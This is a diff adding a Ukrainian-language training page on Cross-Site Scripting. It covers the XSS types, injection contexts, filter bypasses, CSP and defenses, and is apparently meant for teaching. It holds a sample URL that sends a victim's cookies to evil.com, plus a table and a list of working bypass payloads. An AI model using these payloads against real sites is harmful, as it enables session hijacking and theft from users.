@@ -1,0 +1,160 @@
+<section class="module-header">
+  <h1>Модуль 12 — Cross-Site Scripting (XSS)</h1>
+  <p>Опануй вектори XSS-атак у різних контекстах ін'єкції та дізнайся, як браузери аналізують і виконують впроваджений код.</p>
+</section>
+
+<section class="theory-section">
+
+  <h2>Браузер — це поле битви</h2>
+  <p>
+    Якщо SQL injection — це злам банківського сховища, то Cross-Site Scripting (XSS) — це обман банківського касира, щоб він видав гроші не тій людині. XSS не атакує сервер напряму — він атакує <strong>інших користувачів</strong>, впроваджуючи шкідливий JavaScript у веб-сторінки, які вони відвідують.
+  </p>
+  <p>
+    Ось чому XSS жахливий: JavaScript, що працює в браузері користувача, має доступ до <em>всього</em>, що цей користувач може бачити і робити на сайті. Він може читати cookies, перехоплювати натискання клавіш, змінювати вміст сторінки, робити API-запити від імені користувача, перенаправляти на фішингові сторінки і навіть перетворити браузер на проксі для подальших атак. І користувач навіть не підозрює — він бачить звичайну веб-сторінку.
+  </p>
+  <p>
+    XSS — найчастіше знаходена вразливість у bug bounty програмах після IDOR. Вона з'являється практично в кожному веб-додатку, що приймає і відображає введення користувача — а це практично кожен веб-додаток.
+  </p>
+
+  <h2>Три типи XSS</h2>
+
+  <h3>Reflected XSS — одноразова атака</h3>
+  <p>
+    У reflected XSS шкідливий скрипт приходить із поточного HTTP-запиту. Сервер бере введення користувача з URL або даних форми і включає його прямо у відповідь без санітизації. Атака вимагає, щоб жертва натиснула на спеціально створене посилання.
+  </p>
+  <pre><code class="language-python"># Server reflects input directly into HTML — VULNERABLE
+@app.route('/search')
+def search():
+    query = request.args.get('q', '')
+    return f"&lt;h1&gt;Results for: {query}&lt;/h1&gt;"
+
+# Attacker crafts a URL like:
+# https://example.com/search?q=&lt;script&gt;document.location='https://evil.com/steal?c='+document.cookie&lt;/script&gt;</code></pre>
+  <p>
+    Коли жертва натискає на це посилання, сервер повертає тег script у HTML, і браузер жертви його виконує. Скрипт відправляє cookie сесії жертви на сервер атакуючого. Гра закінчена.
+  </p>
+  <p>
+    «Але зачекай,» — можеш подумати, — «хто натисне на URL з <code>&lt;script&gt;</code> у ньому?» На практиці URL кодується (<code>%3Cscript%3E</code>), скорочується сервісом або ховається за редіректом. Більшість людей ніколи не дивляться на URL перед натисканням.
+  </p>
+
+  <h3>Stored XSS — постійна загроза</h3>
+  <p>
+    Stored XSS набагато небезпечніший, бо шкідливий скрипт <em>назавжди</em> зберігається на сервері — в базі даних, полі коментаря, профілі або будь-де, де зберігається контент користувача. <strong>Кожен, хто переглядає сторінку, стає жертвою</strong>, а не лише той, хто натиснув на спеціальне посилання.
+  </p>
+  <p>
+    Уяви форум, де користувачі пишуть коментарі. Якщо атакуючий залишить коментар з JavaScript, і форум відобразить його без санітизації, кожна людина, що переглядає цю тему, отримає виконання шкідливого скрипту у своєму браузері. Одна ін'єкція — тисячі жертв.
+  </p>
+
+  <div class="callout callout-success">
+    <strong>Реальна історія — Хробак Samy (2005):</strong> Семі Камкар створив stored XSS хробака на MySpace, який додавав «Samy is my hero» до кожного зараженого профілю і поширювався на друзів того користувача. За лише 20 годин він заразив <strong>понад 1 мільйон користувачів</strong>, ставши найшвидше поширюваним вірусом в історії. MySpace довелося вимкнути весь сайт. Семі отримав 3 роки випробування, громадські роботи та заборону на користування комп'ютерами. Хробак був технічно «нешкідливим» (лише змінював профілі), але продемонстрував руйнівну силу stored XSS.
+  </div>
+
+  <h3>DOM-Based XSS — клієнтська пастка</h3>
+  <p>
+    У DOM-based XSS вразливість існує повністю в <strong>клієнтському JavaScript</strong>. Сервер ніколи не бачить шкідливий ввід — він обробляється JavaScript у браузері. Це робить DOM XSS складнішим для виявлення серверними засобами безпеки.
+  </p>
+  <pre><code class="language-javascript">// VULNERABLE: innerHTML with untrusted data from URL fragment
+var name = location.hash.slice(1);  // e.g., #&lt;img src=x onerror=alert(1)&gt;
+document.getElementById('greeting').innerHTML = 'Welcome, ' + name + '!';
+
+// SAFE: textContent treats everything as text, not HTML
+document.getElementById('greeting').textContent = 'Welcome, ' + name + '!';</code></pre>
+  <p>
+    Ключова концепція — <strong>джерела і стоки (sources and sinks)</strong>. «Джерело» — це де ненадійні дані потрапляють у JavaScript (<code>location.hash</code>, <code>location.search</code>, <code>document.referrer</code>, <code>window.name</code>). «Стік» — де ці дані використовуються небезпечним чином (<code>innerHTML</code>, <code>eval()</code>, <code>document.write()</code>, <code>setTimeout()</code> з рядковим аргументом). DOM XSS відбувається, коли заражені дані потрапляють із джерела в стік без санітизації.
+  </p>
+
+  <h2>Контексти ін'єкції — де потрапляє твій ввід, має значення</h2>
+  <p>
+    Найважливіша концепція в XSS — це <strong>контекст</strong>. Один і той самий ввід може бути нешкідливим в одному контексті та руйнівним в іншому. Де саме твій ввід потрапляє в HTML, визначає, які пейлоади спрацюють:
+  </p>
+
+  <div class="table-wrapper">
+    <table>
+      <thead><tr><th>Контекст</th><th>Приклад</th><th>Стратегія виходу</th><th>Приклад пейлоаду</th></tr></thead>
+      <tbody>
+        <tr><td>Тіло HTML</td><td><code>&lt;p&gt;Hello USER_INPUT&lt;/p&gt;</code></td><td>Впровадити нові теги</td><td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td></tr>
+        <tr><td>HTML-атрибут</td><td><code>&lt;input value="USER_INPUT"&gt;</code></td><td>Закрити атрибут, додати подію</td><td><code>" onfocus=alert(1) autofocus="</code></td></tr>
+        <tr><td>Рядок JavaScript</td><td><code>var x = 'USER_INPUT';</code></td><td>Закрити рядок, впровадити код</td><td><code>'; alert(1); var x='</code></td></tr>
+        <tr><td>URL/href</td><td><code>&lt;a href="USER_INPUT"&gt;</code></td><td>Протокол javascript:</td><td><code>javascript:alert(1)</code></td></tr>
+        <tr><td>Значення CSS</td><td><code>color: USER_INPUT;</code></td><td>expression() (старий IE)</td><td><code>red; background:url(javascript:...)</code></td></tr>
+        <tr><td>Всередині коментаря</td><td><code>&lt;!-- USER_INPUT --&gt;</code></td><td>Закрити коментар, впровадити тег</td><td><code>--&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;!--</code></td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <p>
+    Ось чому просте «відфільтрувати теги <code>&lt;script&gt;</code>» ніколи не працює. В контексті атрибуту тобі навіть не потрібні теги script — обробник подій <code>onfocus=alert(1)</code> достатній. В контексті JavaScript-рядка потрібно лише закрити рядок. <strong>Контекстно-залежне кодування виводу — єдиний надійний захист.</strong>
+  </p>
+
+  <h2>Техніки обходу фільтрів</h2>
+  <p>
+    Багато додатків намагаються запобігти XSS через блоклісти — фільтруючи небезпечні рядки як <code>&lt;script&gt;</code>. Це як грати у «влуч по кроту». Існують сотні способів виконати JavaScript у HTML, і заблокувати їх усі практично неможливо:
+  </p>
+  <ul>
+    <li><strong>Зміна регістру:</strong> <code>&lt;ScRiPt&gt;alert(1)&lt;/sCrIpT&gt;</code> — HTML-теги нечутливі до регістру</li>
+    <li><strong>Альтернативні теги:</strong> <code>&lt;img src=x onerror=alert(1)&gt;</code>, <code>&lt;svg onload=alert(1)&gt;</code>, <code>&lt;body onload=alert(1)&gt;</code>, <code>&lt;details open ontoggle=alert(1)&gt;</code></li>
+    <li><strong>Вкладені теги:</strong> <code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</code> — якщо фільтр видаляє лише один екземпляр</li>
+    <li><strong>Обробники подій:</strong> <code>onerror</code>, <code>onload</code>, <code>onfocus</code>, <code>onmouseover</code>, <code>onanimationstart</code>, <code>ontoggle</code> — існує понад 80 обробників подій</li>
+    <li><strong>Трюки з кодуванням:</strong> HTML entities (<code>&amp;lt;</code>), URL encoding (<code>%3C</code>), Unicode (<code>\u003c</code>), hex (<code>&#x3c;</code>)</li>
+    <li><strong>Шаблонні рядки:</strong> В контексті JavaScript <code>alert`1`</code> працює без дужок</li>
+  </ul>
+
+  <div class="callout callout-warning">
+    <strong>Урок:</strong> Ніколи не намагайся писати власний XSS-фільтр. Використовуй вбудоване кодування виводу свого фреймворку (шаблонізатор Django авто-екранує, JSX React авто-екранує тощо) та перевірену бібліотеку санітизації як DOMPurify для випадків, коли потрібно дозволити деякий HTML.
+  </div>
+
+  <h2>Що може атакуючий зробити з XSS?</h2>
+  <p>
+    XSS дає атакуючому можливість виконати довільний JavaScript у браузері жертви, в контексті вразливого вебсайту. Це означає:
+  </p>
+  <ul>
+    <li><strong>Викрадення сесії:</strong> Вкрасти cookie сесії через <code>document.cookie</code> і видати себе за жертву</li>
+    <li><strong>Збір облікових даних:</strong> Впровадити фальшиву форму входу, що надсилає дані атакуючому</li>
+    <li><strong>Кейлогінг:</strong> Перехоплювати все, що користувач вводить на сторінці</li>
+    <li><strong>Крадіжка CSRF-токенів:</strong> Прочитати anti-CSRF токени і використати їх для дій від імені жертви</li>
+    <li><strong>Фішинг:</strong> Змінити вміст сторінки, щоб обманом отримати чутливі дані</li>
+    <li><strong>Поширення хробака:</strong> Автоматично розповсюдити XSS на інших користувачів (як хробак Samy)</li>
+    <li><strong>Майнінг криптовалюти:</strong> Використати CPU жертви для майнінгу</li>
+    <li><strong>Експлуатація браузера:</strong> Використати XSS як точку опори для атаки на вразливості браузера (фреймворк BeEF)</li>
+  </ul>
+
+  <h2>Content Security Policy (CSP)</h2>
+  <p>
+    CSP — це механізм захисту на стороні браузера, що вказує, які скрипти дозволено виконувати. Встановлюється через HTTP-заголовок відповіді:
+  </p>
+  <pre><code class="language-http">Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com</code></pre>
+  <p>
+    Ця політика каже: виконувати скрипти лише з того ж origin або з <code>cdn.example.com</code>. Вбудовані скрипти (як <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>) блокуються. Це потужний захист — навіть якщо атакуючий знайде XSS, браузер відмовиться виконувати впроваджений скрипт.
+  </p>
+  <p>
+    Однак CSP настільки сильний, наскільки його конфігурація. Поширені помилки конфігурації:
+  </p>
+  <ul>
+    <li><code>'unsafe-inline'</code> — зводить нанівець всю мету CSP, дозволяючи вбудовані скрипти</li>
+    <li><code>'unsafe-eval'</code> — дозволяє <code>eval()</code>, <code>setTimeout('string')</code> тощо</li>
+    <li><code>data:</code> URI — дозволяють <code>&lt;script src="data:text/javascript,alert(1)"&gt;</code></li>
+    <li>Занадто широкі білі списки — якщо дозволено <code>*.google.com</code>, можна зловживати JSONP-ендпоінтами на доменах Google</li>
+    <li>Відсутня директива <code>base-uri</code> — дозволяє впроваджувати теги <code>&lt;base&gt;</code> для перенаправлення завантаження скриптів</li>
+  </ul>
+
+  <div class="callout callout-info">
+    <strong>Порада:</strong> Щоб оцінити CSP-політику, встав її в Google CSP Evaluator. Він підсвітить слабкості та запропонує покращення. Строгий CSP з nonce-based завантаженням скриптів — золотий стандарт.
+  </div>
+
+  <h2>Захист — правильний шлях</h2>
+  <p>
+    Захист від XSS — багатошаровий:
+  </p>
+  <ol>
+    <li><strong>Контекстно-залежне кодування виводу:</strong> Кодуй введення користувача залежно від того, де воно з'являється в HTML. HTML-кодування для тексту, атрибутне кодування для значень атрибутів, JavaScript-кодування для JS-рядків, URL-кодування для URL. Твій шаблонізатор, ймовірно, робить це автоматично — не обходь його через <code>|safe</code> або <code>dangerouslySetInnerHTML</code> без крайньої необхідності.</li>
+    <li><strong>Content Security Policy:</strong> Розгорни строгий CSP, що блокує вбудовані скрипти та обмежує джерела.</li>
+    <li><strong>HttpOnly cookies:</strong> Встанови прапорець <code>HttpOnly</code> на cookie сесії, щоб JavaScript не міг їх прочитати.</li>
+    <li><strong>Валідація вводу:</strong> Відхиляй ввід, що не відповідає очікуваним шаблонам. Поле email не повинно містити символ <code>&lt;</code>.</li>
+    <li><strong>DOMPurify:</strong> Коли потрібно рендерити HTML від користувача (rich text, markdown), використовуй DOMPurify для санітизації.</li>
+  </ol>
+
+  <div class="callout callout-danger">
+    <strong>Пам'ятай:</strong> Кодування виводу — це НЕ те саме, що валідація вводу. Валідація вводу перехоплює деякі атаки, але остаточний захист — кодування виводу у правильному контексті. Навіть «безпечний» ввід як ім'я може містити <code>&lt;</code>. Кодуй на виході, завжди.
+  </div>
+
+</section>
